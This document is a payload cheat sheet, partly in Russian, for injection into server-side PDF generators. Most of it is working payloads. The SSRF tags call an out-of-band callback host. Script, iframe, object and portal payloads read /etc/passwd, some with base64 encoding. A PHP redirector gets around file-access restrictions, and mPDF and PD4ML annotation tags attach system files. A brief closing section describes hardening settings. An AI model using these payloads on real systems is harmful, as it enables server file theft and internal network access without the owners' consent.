# PDS Injection
- Get current path
```javascript
<script>document.write(window.location)</script>
```

## SSRF
- `<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>`
- `<link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >`
- `<iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>`

## LFI
```javascript
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(this.responseText)
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```
**With encoding**
```javascript
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(btoa(this.responseText))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```
**linebreaks every 100 characters**
```javascript
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

## Without JS execution
```html
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
```

### With redirect
1. Создать на своем сервере следующий файл
```php
<?php header('Location: file://' . $_GET['url']); ?>
```
2. Вставить следующую полезную нагрузку
```html
<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
```

## Аннотации
- mPDF
```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```
- PD4ML
```html
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```

## Preventing
Many PDF generation libraries default the configuration to allow access to external resources. Setting this option to `false` effectively prevents SSRF vulnerabilities. In the DomPDf library, this option is called `enable_remote`.<p>
In some libraries, there are other configuration options that enable the execution of JavaScript and even PHP code on the server. While using features like these might be helpful for the dynamic generation of PDF files, they are also extremely dangerous, as the injection of PHP code can lead to remote code execution (RCE). For example, the `DomPDF` library has a configuration option called `isPhpEnabled` that enables PHP code execution; this option should be disabled because it's a security risk.

### Settings
- JavaScript code should not be executed under any circumstances
- Access to local files should be disallowed
- Access to external resources should be disallowed or limited if it is required
